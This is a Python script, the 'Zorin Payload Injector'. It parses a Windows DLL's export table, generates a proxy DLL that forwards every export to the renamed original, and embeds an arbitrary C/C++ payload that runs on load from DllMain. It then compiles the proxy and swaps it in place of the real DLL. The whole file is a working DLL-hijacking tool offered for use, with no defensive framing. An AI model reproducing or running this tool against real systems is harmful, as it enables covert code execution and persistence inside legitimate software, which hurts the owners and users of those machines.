#!/usr/bin/env python3
"""
Zorin Payload Injector v1.0 (Enhanced Edition)
Pure Python PE Parser + Modern C/C++ Proxy Generator
"""

import sys
import os
import struct
import subprocess
import shutil
import argparse
from pathlib import Path

# Fix Windows console UTF-8 output
if sys.platform == "win32":
    try:
        if hasattr(sys.stdout, 'reconfigure'):
            sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        if hasattr(sys.stderr, 'reconfigure'):
            sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

class PEParser:
    """Pure Python PE export extractor (No dumpbin or external dependencies required)"""
    @staticmethod
    def get_exports(dll_path):
        dll_path = Path(dll_path)
        with open(dll_path, 'rb') as f:
            data = f.read()

        if len(data) < 64:
            return []

        # 1. DOS Header
        if data[:2] != b'MZ':
            return []
        
        e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
        if e_lfanew + 4 + 20 > len(data):
            return []

        # 2. NT Signature
        if data[e_lfanew:e_lfanew+4] != b'PE\x00\x00':
            return []

        file_header_offset = e_lfanew + 4
        machine, num_sections = struct.unpack_from('<HH', data, file_header_offset)[:2]
        opt_hdr_size = struct.unpack_from('<H', data, file_header_offset + 16)[0]
        opt_hdr_offset = file_header_offset + 20

        opt_magic = struct.unpack_from('<H', data, opt_hdr_offset)[0]
        export_rva = 0
        export_size = 0

        if opt_magic == 0x10B: # PE32 (32-bit)
            rva_count = struct.unpack_from('<I', data, opt_hdr_offset + 92)[0]
            if rva_count > 0:
                export_rva, export_size = struct.unpack_from('<II', data, opt_hdr_offset + 96)
        elif opt_magic == 0x20B: # PE32+ (64-bit)
            rva_count = struct.unpack_from('<I', data, opt_hdr_offset + 108)[0]
            if rva_count > 0:
                export_rva, export_size = struct.unpack_from('<II', data, opt_hdr_offset + 112)
        else:
            return []

        if export_rva == 0 or export_size == 0:
            return []

        # 3. Read Section Headers to convert RVA to File Offset
        sec_offset = opt_hdr_offset + opt_hdr_size
        sections = []
        for i in range(num_sections):
            curr_sec = sec_offset + (i * 40)
            if curr_sec + 40 > len(data):
                break
            v_size, v_addr, raw_size, raw_ptr = struct.unpack_from('<IIII', data, curr_sec + 8)
            sec_len = v_size if v_size > 0 else raw_size
            sections.append((v_addr, sec_len, raw_ptr))

        def rva_to_offset(rva):
            for v_addr, sec_len, raw_ptr in sections:
                if v_addr <= rva < v_addr + sec_len:
                    return (rva - v_addr) + raw_ptr
            return None

        exp_offset = rva_to_offset(export_rva)
        if exp_offset is None or exp_offset + 40 > len(data):
            return []

        n_base, num_funcs, num_names, addr_funcs, addr_names, addr_ords = struct.unpack_from(
            '<IIIIII', data, exp_offset + 16
        )

        offset_funcs = rva_to_offset(addr_funcs)
        offset_names = rva_to_offset(addr_names)
        offset_ords = rva_to_offset(addr_ords)

        if not offset_funcs:
            return []

        # Map name ordinals to function names
        names_by_ord = {}
        if offset_names and offset_ords:
            for i in range(num_names):
                name_rva = struct.unpack_from('<I', data, offset_names + (i * 4))[0]
                ord_val = struct.unpack_from('<H', data, offset_ords + (i * 2))[0]
                n_off = rva_to_offset(name_rva)
                if n_off:
                    end = data.find(b'\x00', n_off)
                    if end != -1:
                        func_name = data[n_off:end].decode('ascii', errors='ignore')
                        names_by_ord[ord_val] = func_name

        exports = []
        for i in range(num_funcs):
            func_rva = struct.unpack_from('<I', data, offset_funcs + (i * 4))[0]
            if func_rva == 0:
                continue
            name = names_by_ord.get(i, f"ord_{n_base + i}")
            exports.append((name, n_base + i))

        return exports


class DLLInjector:
    def __init__(self, dll_path, payload_path, output_path=None, backup_suffix="_org"):
        self.dll_path = Path(dll_path).resolve()
        self.payload_path = Path(payload_path).resolve()
        self.output_path = Path(output_path).resolve() if output_path else self.dll_path
        self.backup_suffix = backup_suffix
        
        if not self.dll_path.exists():
            raise FileNotFoundError(f"DLL not found: {dll_path}")
        if not self.payload_path.exists():
            raise FileNotFoundError(f"Payload not found: {payload_path}")

    def get_dll_exports(self):
        """Extract exported functions from the original DLL using pure Python PE parser"""
        print("[+] Extracting exports from original DLL via built-in PE parser...")
        exports = PEParser.get_exports(self.dll_path)
        
        # Fallback to dumpbin if available and native returned 0
        if not exports:
            cmd = ['dumpbin', '/exports', str(self.dll_path)]
            try:
                result = subprocess.run(cmd, capture_output=True, text=True)
                if result.returncode == 0:
                    in_exports = False
                    for line in result.stdout.split('\n'):
                        if 'ordinal hint' in line.lower():
                            in_exports = True
                            continue
                        if in_exports and line.strip():
                            parts = line.split()
                            if len(parts) >= 4:
                                func_name = parts[-1]
                                if func_name and not func_name.startswith('['):
                                    exports.append((func_name, len(exports) + 1))
            except FileNotFoundError:
                pass

        print(f"[+] Found {len(exports)} exported functions")
        return exports

    def create_def_file(self, exports, dll_name):
        """Create DEF file for export forwarding"""
        org_lib_name = f"{dll_name}{self.backup_suffix}"
        def_content = f"LIBRARY \"{dll_name}\"\nEXPORTS\n"
        
        for name, ordinal in exports:
            def_content += f"    {name} = {org_lib_name}.{name} @{ordinal}\n"
        
        def_path = self.dll_path.parent / f"{dll_name}_proxy.def"
        with open(def_path, 'w') as f:
            f.write(def_content)
        
        print(f"[+] Created DEF file with {len(exports)} exports: {def_path.name}")
        return def_path

    def create_proxy_dll_source(self):
        """Create proxy DLL source code with embedded payload safely"""
        print("[+] Creating proxy DLL source code...")
        
        with open(self.payload_path, 'r', encoding='utf-8', errors='ignore') as f:
            payload_code = f.read()

        call_target = "payload()"
        if "user_payload" in payload_code and "payload()" not in payload_code:
            call_target = "user_payload()"

        proxy_code = f'''/* Zorin Proxy Source */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <process.h>
#include <stdio.h>

/* Embedded Payload */
#line 1 "{self.payload_path.name}"
{payload_code}

static volatile LONG g_executed = 0;
static HMODULE g_hOriginal = NULL;

static DWORD WINAPI ZorinWorker(LPVOID lpParam) {{
    (void)lpParam;
    Sleep(50);
    {call_target};
    return 0;
}}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {{
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {{
        DisableThreadLibraryCalls(hinst);
        if (InterlockedCompareExchange(&g_executed, 1, 0) == 0) {{
            HANDLE h = CreateThread(NULL, 0, ZorinWorker, NULL, 0, NULL);
            if (h) CloseHandle(h);
        }}
    }}
    return TRUE;
}}
'''
        proxy_path = self.dll_path.parent / f"{self.dll_path.stem}_proxy.cpp"
        with open(proxy_path, 'w', encoding='utf-8') as f:
            f.write(proxy_code)
        
        print(f"[+] Proxy source created: {proxy_path.name}")
        return proxy_path

    def compile_proxy_dll(self, proxy_source, def_file, temp_output):
        """Compile proxy DLL using g++ or gcc"""
        print("[+] Compiling proxy DLL with MinGW...")
        
        compiler = "g++" if shutil.which("g++") else "gcc"
        cmd = [
            compiler,
            '-shared',
            '-O2',
            '-s',
            '-o', str(temp_output),
            str(proxy_source),
            str(def_file),
            '-Wl,--enable-stdcall-fixup',
            '-static-libgcc',
            '-static-libstdc++',
            '-luser32',
            '-lkernel32'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise RuntimeError(f"Compilation failed:\n{result.stderr}")
        
        print(f"[+] Compilation successful! Output size: {temp_output.stat().st_size:,} bytes")
        return temp_output

    def inject(self, force=False):
        """Perform DLL proxy injection"""
        try:
            print("\n" + "="*58)
            print("  Zorin DLL Proxy Injector (Python Edition v1.0)")
            print("="*58 + "\n")
            
            original_backup = self.dll_path.parent / f"{self.dll_path.stem}{self.backup_suffix}{self.dll_path.suffix}"
            temp_dll = self.dll_path.parent / f"{self.dll_path.stem}_temp{self.dll_path.suffix}"
            
            if original_backup.exists() and not force:
                print(f"[!] Backup already exists: {original_backup}")
                resp = input("[?] Overwrite existing backup? (y/N): ")
                if resp.lower() != 'y':
                    print("[-] Aborted.")
                    return False
                original_backup.unlink()
            
            exports = self.get_dll_exports()
            if not exports:
                print("[!] Warning: Target DLL exports are empty or could not be detected.")
            
            def_file = self.create_def_file(exports, self.dll_path.stem)
            proxy_source = self.create_proxy_dll_source()
            
            self.compile_proxy_dll(proxy_source, def_file, temp_dll)
            
            print(f"\n[+] Performing atomic DLL swap...")
            if self.dll_path.exists():
                shutil.move(str(self.dll_path), str(original_backup))
                print(f"[✓] Original backed up to: {original_backup.name}")
            
            shutil.move(str(temp_dll), str(self.dll_path))
            print(f"[✓] Proxy installed: {self.dll_path.name}")
            
            # Clean up temporary sources
            proxy_source.unlink(missing_ok=True)
            def_file.unlink(missing_ok=True)
            
            print("\n" + "="*58)
            print("[✓] INJECTION COMPLETED SUCCESSFULLY!")
            print("="*58)
            print(f"  • Backup DLL: {original_backup}")
            print(f"  • Active Proxy: {self.dll_path}\n")
            return True
            
        except Exception as e:
            print(f"\n[✗] Error: {e}")
            import traceback
            traceback.print_exc()
            return False

def restore(target_dll, backup_suffix="_org"):
    target = Path(target_dll).resolve()
    backup = target.parent / f"{target.stem}{backup_suffix}{target.suffix}"
    print(f"[*] Restoring: {target.name}")
    if not backup.exists():
        print(f"[✗] Backup file not found: {backup}")
        return False
    if target.exists():
        target.unlink()
    shutil.move(str(backup), str(target))
    print(f"[✓] Restored original DLL from {backup.name}")
    return True

def list_exports(target_dll):
    target = Path(target_dll).resolve()
    if not target.exists():
        print(f"[✗] File not found: {target}")
        return
    exports = PEParser.get_exports(target)
    print(f"\n[*] Exports for {target.name} (Total: {len(exports)}):")
    print("-" * 50)
    for name, ord_val in exports:
        print(f"  @{ord_val:<6} {name}")
    print("-" * 50 + "\n")

def main():
    parser = argparse.ArgumentParser(description="Zorin DLL Injector & Proxy Generator")
    parser.add_argument("dll", nargs="?", help="Target DLL to proxy")
    parser.add_argument("payload", nargs="?", help="C/C++ payload source file")
    parser.add_argument("-r", "--restore", action="store_true", help="Restore original DLL from backup")
    parser.add_argument("-l", "--list-exports", action="store_true", help="List exported functions")
    parser.add_argument("-b", "--backup-suffix", default="_org", help="Backup suffix (default: _org)")
    parser.add_argument("-f", "--force", action="store_true", help="Force overwrite without confirmation")
    args = parser.parse_args()

    if args.list_exports:
        if not args.dll:
            print("[✗] Error: target DLL required for --list-exports")
            sys.exit(1)
        list_exports(args.dll)
        return

    if args.restore:
        if not args.dll:
            print("[✗] Error: target DLL required for --restore")
            sys.exit(1)
        ok = restore(args.dll, args.backup_suffix)
        sys.exit(0 if ok else 1)

    if not args.dll or not args.payload:
        parser.print_help()
        sys.exit(1)

    injector = DLLInjector(args.dll, args.payload, backup_suffix=args.backup_suffix)
    ok = injector.inject(force=args.force)
    sys.exit(0 if ok else 1)

if __name__ == "__main__":
    main()